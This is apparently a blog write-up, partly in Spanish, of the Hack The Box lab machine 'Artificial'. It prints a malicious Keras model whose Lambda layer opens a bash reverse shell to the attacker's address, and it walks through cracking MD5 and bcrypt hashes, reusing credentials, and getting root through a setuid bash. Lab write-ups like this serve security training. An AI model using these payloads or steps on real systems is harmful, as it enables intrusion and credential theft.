---
layout: single
title: Artificial - Hack The Box
excerpt: "Artificial Season 8 (Week 6)"
date: 2025-06-26
classes: wide
header:
  teaser: /img2/artificial.png
  teaser_home_page: true
  icon: /img2/images/hackthebox.webp
categories:
  - hackthebox
  - Linux
  - Easy
tags:
  - AI Model Tensorflow RCE
  - SQLite Database File Enumeration
  - MD5 Cracking hashes
  - Information Leakage
  - Backrest 1.7.2 RCE [Privilege Escalation]
---


## Reconnaissance

- Nmap 

```bash
❯ nmap -sS --open -p- --min-rate 5000 -n -Pn 10.10.11.74
```

```ruby
Starting Nmap 7.95 ( https://nmap.org ) at 2025-06-23 18:01 CEST
Nmap scan report for 10.10.11.74
Host is up (0.077s latency).
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http

Nmap done: 1 IP address (1 host up) scanned in 10.43 seconds
```

- Vulnerability and version scan

```bash
❯ nmap -sCV -p22,80 10.10.11.74
```

```ruby
Starting Nmap 7.95 ( https://nmap.org ) at 2025-06-23 18:01 CEST
Nmap scan report for 10.10.11.74
Host is up (0.041s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.13 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 7c:e4:8d:84:c5:de:91:3a:5a:2b:9d:34:ed:d6:99:17 (RSA)
|   256 83:46:2d:cf:73:6d:28:6f:11:d5:1d:b4:88:20:d6:7c (ECDSA)
|_  256 e3:18:2e:3b:40:61:b4:59:87:e8:4a:29:24:0f:6a:fc (ED25519)
80/tcp open  http    nginx 1.18.0 (Ubuntu)
|_http-title: Did not follow redirect to http://artificial.htb/
|_http-server-header: nginx/1.18.0 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 9.62 seconds
```

- Add domain to /etc/hosts

```bash
echo "10.10.11.74 artificial.htb" >> /etc/hosts
```

## Exploitation

- Remote Code Execution in Tensorflow

```python
import numpy as np
import pandas as pd
import tensorflow as tf
from tensorflow import keras
from tensorflow.keras import layers

np.random.seed(42)

# Create hourly data for a week
hours = np.arange(0, 24 * 7)
profits = np.random.rand(len(hours)) * 100

# Create a DataFrame
data = pd.DataFrame({
    'hour': hours,
    'profit': profits
})

X = data['hour'].values.reshape(-1, 1)
y = data['profit'].values

def exploit(x):
  import os
  os.system("ping -c1 10.10.14.4")
  return x


# Build the model
model = keras.Sequential([
    layers.Dense(64, activation='relu', input_shape=(1,)),
    layers.Dense(64, activation='relu'),
    layers.Dense(1)
])

model.add(tf.keras.layers.Lambda(exploit))

# Compile the model
model.compile(optimizer='adam', loss='mean_squared_error')

# Train the model
model.fit(X, y, epochs=100, verbose=1)

# Save the model
model.save('profits_model.h5')
```

```bash
python3 test.py
```

> Primero creamos el modelo añadiendo una función lambda con código malicioso.

![](/img2/Pasted%20image%2020250626115844.png)

```bash
❯ tcpdump -i tun0 icmp
```

```ruby
tcpdump: verbose output suppressed, use -v[v]... for full protocol decode
listening on tun0, link-type RAW (Raw IP), snapshot length 262144 bytes
11:58:43.108238 IP artificial.htb > 10.10.14.4: ICMP echo request, id 3, seq 1, length 64
11:58:43.108300 IP 10.10.14.4 > artificial.htb: ICMP echo reply, id 3, seq 1, length 64
11:58:43.243388 IP artificial.htb > 10.10.14.4: ICMP echo request, id 4, seq 1, length 64
11:58:43.243423 IP 10.10.14.4 > artificial.htb: ICMP echo reply, id 4, seq 1, length 64
```

- Reverse Shell

```python
import numpy as np
import pandas as pd
import tensorflow as tf
from tensorflow import keras
from tensorflow.keras import layers

np.random.seed(42)

# Create hourly data for a week
hours = np.arange(0, 24 * 7)
profits = np.random.rand(len(hours)) * 100

# Create a DataFrame
data = pd.DataFrame({
    'hour': hours,
    'profit': profits
})

X = data['hour'].values.reshape(-1, 1)
y = data['profit'].values

def exploit(x):
  import os
  os.system("bash -c 'bash -i >& /dev/tcp/10.10.14.4/9000 0>&1'")
  return x


# Build the model
model = keras.Sequential([
    layers.Dense(64, activation='relu', input_shape=(1,)),
    layers.Dense(64, activation='relu'),
    layers.Dense(1)
])

model.add(tf.keras.layers.Lambda(exploit))

# Compile the model
model.compile(optimizer='adam', loss='mean_squared_error')

# Train the model
model.fit(X, y, epochs=100, verbose=1)

# Save the model
model.save('profits_model.h5')
```

```bash
python3 test.py
```

```bash
❯ nc -nlvp 9000
```

```ruby
listening on [any] 9000 ...
connect to [10.10.14.4] from (UNKNOWN) [10.10.11.74] 47614
bash: cannot set terminal process group (801): Inappropriate ioctl for device
bash: no job control in this shell
app@artificial:~/app$ 
```


## Post-exploitation

- Crack sqlite3 passwords

```bash
app@artificial:~/app$ sqlite3 instance/users.db 'select password from user;'
```

```ruby
c99175974b6e192936d97224638a34f8
0f3d8c76530022670f1c6029eed09ccb
b606c5f5136170f15444251665638b36
bc25b1f80f544c0ab451c02a3dca9fc6
bf041041e57f1aff3be7ea1abd6129d0
6817551a575da54cc64b3733a644d54f
903a98d709fa4683aaaa036b84c125a6
455523d86a8a1ab7c7d33208fe0219e7
d41d8cd98f00b204e9800998ecf8427e
63a9f0ea7bb98050796b649e85481845
21232f297a57a5a743894a0e4a801fc3
098f6bcd4621d373cade4e832627b4f6
084e0343a0486ff05530df6c705c8bb4
caf9b6b99962bf5c2264824231d7a40c
b09c600fddc573f117449b3723f23d64
81c3b080dad537de7e10e0987a4bf52e
ee11cbb19052e40b07aac0ca060c23ee
200ceb26807d6bf99fd6f4f0d1ca54d4
a189c633d9995e11bf8607170ec9a4b8
ff104b2dfab9fe8c0676587292a636d3
72ab8af56bddab33b269c5964b26620a
768747907b90c39ab6f16fcb3320897a
640c8a5376aa12fa15cf02130ce239a6
23b0749d7d3a9ee3c0b024a86fe3e1c2
63623900c8bbf21c706c45dcb7a2c083
5ff4fe5cb694d92583d391dd8529066d
1d7c2923c1684726dc23d2901c4d8157
5f4dcc3b5aa765d61d8327deb882cf99
5f4dcc3b5aa765d61d8327deb882cf99
202cb962ac59075b964b07152d234b70
b911af807c2df88d671bd7004c54c1c2
6b8b7f464edd8fb2b4d394dd2fbad052
04217c4d7e246e38b0d7014ee109755b
```

```bash
❯ hashcat -a 0 -m 0 hash /usr/share/wordlists/rockyou.txt
```

```ruby
hashcat (v6.2.6) starting

OpenCL API (OpenCL 3.0 PoCL 6.0+debian  Linux, None+Asserts, RELOC, SPIR-V, LLVM 18.1.8, SLEEF, DISTRO, POCL_DEBUG) - Platform #1 [The pocl project]
====================================================================================================================================================
* Device #1: cpu-haswell-AMD Ryzen 5 5600X 6-Core Processor, 6924/13913 MB (2048 MB allocatable), 6MCU

Minimum password length supported by kernel: 0
Maximum password length supported by kernel: 256

Hashes: 33 digests; 32 unique digests, 1 unique salts
Bitmaps: 16 bits, 65536 entries, 0x0000ffff mask, 262144 bytes, 5/13 rotates
Rules: 1

Optimizers applied:
* Zero-Byte
* Early-Skip
* Not-Salted
* Not-Iterated
* Single-Salt
* Raw-Hash

ATTENTION! Pure (unoptimized) backend kernels selected.
Pure kernels can crack longer passwords, but drastically reduce performance.
If you want to switch to optimized kernels, append -O to your commandline.
See the above message to find out about the exact limits.

Watchdog: Temperature abort trigger set to 90c

INFO: Removed 20 hashes found as potfile entries.

Host memory required for this attack: 1 MB

Dictionary cache hit:
* Filename..: /usr/share/wordlists/rockyou.txt
* Passwords.: 14344385
* Bytes.....: 139921507
* Keyspace..: 14344385

5f4dcc3b5aa765d61d8327deb882cf99:password                 
d41d8cd98f00b204e9800998ecf8427e:                         
200ceb26807d6bf99fd6f4f0d1ca54d4:administrator            
c99175974b6e192936d97224638a34f8:mattp005numbertwo        
bc25b1f80f544c0ab451c02a3dca9fc6:marwinnarak043414036     
Approaching final keyspace - workload adjusted.           

                                                          
Session..........: hashcat
Status...........: Exhausted
Hash.Mode........: 0 (MD5)
Hash.Target......: hash
Time.Started.....: Thu Jun 26 12:14:51 2025 (3 secs)
Time.Estimated...: Thu Jun 26 12:14:54 2025 (0 secs)
Kernel.Feature...: Pure Kernel
Guess.Base.......: File (/usr/share/wordlists/rockyou.txt)
Guess.Queue......: 1/1 (100.00%)
Speed.#1.........:  5216.1 kH/s (0.21ms) @ Accel:1024 Loops:1 Thr:1 Vec:8
Recovered........: 25/32 (78.12%) Digests (total), 5/32 (15.62%) Digests (new)
Progress.........: 14344385/14344385 (100.00%)
Rejected.........: 0/14344385 (0.00%)
Restore.Point....: 14344385/14344385 (100.00%)
Restore.Sub.#1...: Salt:0 Amplifier:0-1 Iteration:0-1
Candidate.Engine.: Device Generator
Candidates.#1....: $HEX[216361726f6c796e] -> $HEX[042a0337c2a156616d6f732103]
Hardware.Mon.#1..: Util: 40%

Started: Thu Jun 26 12:14:51 2025
Stopped: Thu Jun 26 12:14:55 2025
```

> Credenciales encontradas: password, administrator, mattp005numbertwo, marwinnarak043414036.

- Pivoting

```bash
app@artificial:~/app$ su gael
```

```ruby
Password: 
gael@artificial:/home/app/app$ 
```

> Credenciales: gael:mattp005numbertwo

- Check user groups

```bash
gael@artificial:/tmp$ id
```

```ruby
uid=1000(gael) gid=1000(gael) groups=1000(gael),1007(sysadm)
```

```bash
gael@artificial:/tmp$ find / -group sysadm 2>/dev/null
```

```ruby
/var/backups/backrest_backup.tar.gz
```

- Get leaked credentials

```bash
❯ 7z l backrest_backup.tar.gz
```

```ruby
7-Zip 24.09 (x64) : Copyright (c) 1999-2024 Igor Pavlov : 2024-11-29
 64-bit locale=C.UTF-8 Threads:128 OPEN_MAX:1024, ASM

Scanning the drive for archives:
1 file, 52357120 bytes (50 MiB)

Listing archive: private.gz

--
Path = private.gz
Open WARNING: Cannot open the file as [gzip] archive
Type = tar
Physical Size = 52357120
Headers Size = 10752
Code Page = UTF-8
Characteristics = GNU ASCII

   Date      Time    Attr         Size   Compressed  Name
------------------- ----- ------------ ------------  ------------------------
2025-03-05 00:17:53 D....            0            0  backrest
2025-03-03 06:28:26 .....     26501272     26501632  backrest/restic
2025-03-05 00:17:53 .....            0            0  backrest/oplog.sqlite-wal
2025-03-05 00:17:53 .....        32768        32768  backrest/oplog.sqlite-shm
2025-03-03 23:27:17 D....            0            0  backrest/.config
2025-03-05 00:17:42 D....            0            0  backrest/.config/backrest
2025-03-05 00:17:42 .....          280          512  backrest/.config/backrest/config.json
2025-03-03 23:18:52 .....            0            0  backrest/oplog.sqlite.lock
2025-02-16 21:38:14 .....     25690264     25690624  backrest/backrest
2025-03-05 00:17:53 D....            0            0  backrest/tasklogs
2025-03-05 00:17:53 .....        32768        32768  backrest/tasklogs/logs.sqlite-shm
2025-03-03 23:18:52 D....            0            0  backrest/tasklogs/.inprogress
2025-03-05 00:17:53 .....            0            0  backrest/tasklogs/logs.sqlite-wal
2025-03-05 00:13:00 .....        24576        24576  backrest/tasklogs/logs.sqlite
2025-03-05 00:13:00 .....        57344        57344  backrest/oplog.sqlite
2025-03-03 23:18:53 .....           64          512  backrest/jwt-secret
2025-03-03 23:18:52 D....            0            0  backrest/processlogs
2025-03-05 00:17:54 .....         2122         2560  backrest/processlogs/backrest.log
2025-03-03 06:28:57 .....         3025         3072  backrest/install.sh
------------------- ----- ------------ ------------  ------------------------
2025-03-05 00:17:54           52344483     52346368  13 files, 6 folders

Warnings: 1                
```

```bash
❯ cat backrest/.config/backrest/config.json
```

```ruby
{
  "modno": 2,
  "version": 4,
  "instance": "Artificial",
  "auth": {
    "disabled": false,
    "users": [
      {
        "name": "backrest_root",
        "passwordBcrypt": "JDJhJDEwJGNWR0l5OVZNWFFkMGdNNWdpbkNtamVpMmtaUi9BQ01Na1Nzc3BiUnV0WVA1OEVCWnovMFFP"
      }
    ]
  }
}
```

> Encontramos unas credenciales para el usuario backrest_root, probablemente haya un servicio corriendo internamente. Antes de nada tenemos que crackear la contraseña.

```bash
❯ echo "JDJhJDEwJGNWR0l5OVZNWFFkMGdNNWdpbkNtamVpMmtaUi9BQ01Na1Nzc3BiUnV0WVA1OEVCWnovMFFP" | base64 -d > hash
```

```bash
❯ john --wordlist=/usr/share/wordlists/rockyou.txt hash
```

```ruby
Using default input encoding: UTF-8
Loaded 1 password hash (bcrypt [Blowfish 32/64 X3])
Cost 1 (iteration count) is 1024 for all loaded hashes
Will run 6 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
!@#$%^           (?)     
1g 0:00:00:23 DONE (2025-06-27 11:38) 0.04240g/s 229.0p/s 229.0c/s 229.0C/s melani..huevos
Use the "--show" option to display all of the cracked passwords reliably
Session completed. 
```

> Contraseña encontrada: "!@#$%^"

- Check internal ports

```bash
gael@artificial:/tmp$ ss -nltp
```

```ruby
State                   Recv-Q                  Send-Q                                   Local Address:Port                                     Peer Address:Port                  Process                  
LISTEN                  0                       2048                                         127.0.0.1:5000                                          0.0.0.0:*                                              
LISTEN                  0                       4096                                         127.0.0.1:9898                                          0.0.0.0:*                                              
LISTEN                  0                       511                                            0.0.0.0:80                                            0.0.0.0:*                                              
LISTEN                  0                       4096                                     127.0.0.53%lo:53                                            0.0.0.0:*                                              
LISTEN                  0                       128                                            0.0.0.0:22                                            0.0.0.0:*                                              
LISTEN                  0                       511                                               [::]:80                                               [::]:*                                              
LISTEN                  0                       128                                               [::]:22                                               [::]:*
```

> Encontramos un posible servicio interno en el puerto 9898.

- Backrest 1.7.2 RCE (Privilege Escalation)

![](/img2/Pasted%20image%2020250627115137.png)

```bash
gael@artificial:/tmp$ ls -la /bin/bash
```

```ruby
-rwsr-xr-x 1 root root 1183448 Apr 18  2022 /bin/bash
```

```bash
gael@artificial:/tmp$ bash -p
```

```ruby
bash-5.0# cat /root/root.txt 
c699b0fa329d9a56cdd85aa119a2bdee
```


![](/img2/Pasted%20image%2020250626170139.png)